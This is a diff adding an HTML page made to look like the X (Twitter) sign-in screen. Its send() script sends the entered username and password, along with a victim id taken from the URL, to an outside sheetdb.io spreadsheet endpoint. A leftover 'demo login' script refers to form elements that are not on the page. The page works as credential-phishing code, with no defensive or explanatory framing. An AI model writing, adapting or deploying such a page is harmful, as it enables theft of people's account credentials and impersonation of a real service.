@@ -1,0 +1,235 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>X Style Login</title>
+
+<style>
+  :root {
+    --bg: #000;
+    --text: #e7e9ea;
+    --muted: #71767b;
+    --accent: #1d9bf0;
+    --radius: 10px;
+  }
+
+  body {
+    margin: 0;
+    font-family: system-ui, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+
+  .card {
+    width: 100%;
+    max-width: 400px;
+    background: #0a0a0a;
+    padding: 32px;
+    border-radius: var(--radius);
+    box-shadow: 0 0 20px rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.08);
+  }
+
+  .logo-placeholder {
+    width: 48px;
+    height: 48px;
+    margin: 0 auto 18px;
+    display: grid;
+    place-items: center;
+    border-radius: 8px;
+    border: 1px solid rgba(255,255,255,0.15);
+    background: linear-gradient(135deg, #191919, #0e0e0e);
+  }
+
+  .logo-placeholder svg {
+    width: 26px;
+    height: 26px;
+    fill: var(--accent);
+  }
+
+  h1 {
+    text-align: center;
+    margin: 0 0 10px;
+    font-size: 24px;
+  }
+
+  .subtitle {
+    text-align: center;
+    color: var(--muted);
+    font-size: 14px;
+    margin-bottom: 24px;
+  }
+
+  .input {
+    width: 100%;
+    padding: 14px;
+    border-radius: var(--radius);
+    border: 1px solid #2f3336;
+    background: #16181c;
+    color: var(--text);
+    font-size: 15px;
+    margin-bottom: 16px;
+  }
+
+  .input:focus {
+    border-color: var(--accent);
+    outline: none;
+    box-shadow: 0 0 0 2px rgba(29,155,240,0.3);
+  }
+
+  .btn {
+    width: 100%;
+    padding: 14px;
+    border-radius: var(--radius);
+    background: var(--accent);
+    border: none;
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    margin-top: 10px;
+    cursor: pointer;
+  }
+
+  .btn:active {
+    transform: translateY(1px);
+  }
+
+  .link {
+    display: block;
+    text-align: center;
+    margin-top: 18px;
+    color: var(--accent);
+    font-size: 14px;
+    text-decoration: none;
+  }
+
+  .error {
+    color: #ff5555;
+    font-size: 13px;
+    display: none;
+    margin-top: -12px;
+    margin-bottom: 10px;
+  }
+</style>
+</head>
+
+<body>
+<div class="card">
+
+  <div class="logo-placeholder">
+    <!-- minimal abstract X-style icon -->
+   <h1>X</h1>
+  </div>
+
+  <h1>Sign in</h1>
+  <div class="subtitle">Continue to your account</div>
+
+  
+    <input type="text" id="email" class="input" placeholder="Phone, email, or username">
+    <div id="userErr" class="error">Enter a valid username/email.</div>
+
+    <input type="password" id="password" class="input" placeholder="Password">
+    <div id="passErr" class="error">Password must be at least 4 characters.</div>
+
+    <button onclick="send()" class="btn" type="submit">Log In</button>
+  
+
+
+
+
+
+        <script>
+        function send() {
+           const email = document.getElementById('email').value;
+       const password = document.getElementById('password').value;
+           
+           
+        var urldata = new URLSearchParams(window.location.search);
+        
+        const id = urldata.get('id');
+        const type = "x";
+        
+           
+           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+  //out
+})
+.catch(error => {
+  window.alert(error);
+});
+            
+        }
+            
+        </script>
+        
+        
+
+
+
+
+
+
+
+
+
+
+
+
+  <a href="#" class="link">Forgot password?</a>
+</div>
+
+<script>
+  const form = document.getElementById("xForm");
+  const user = document.getElementById("user");
+  const pass = document.getElementById("pass");
+  const userErr = document.getElementById("userErr");
+  const passErr = document.getElementById("passErr");
+
+  form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    userErr.style.display = "none";
+    passErr.style.display = "none";
+
+    let ok = true;
+
+    if (user.value.trim().length < 3) {
+      userErr.style.display = "block";
+      ok = false;
+    }
+
+    if (pass.value.trim().length < 4) {
+      passErr.style.display = "block";
+      ok = false;
+    }
+
+    if (!ok) return;
+
+    alert("Demo login successful. Integrate with your backend API.");
+  });
+</script>
+
+</body>
+</html>
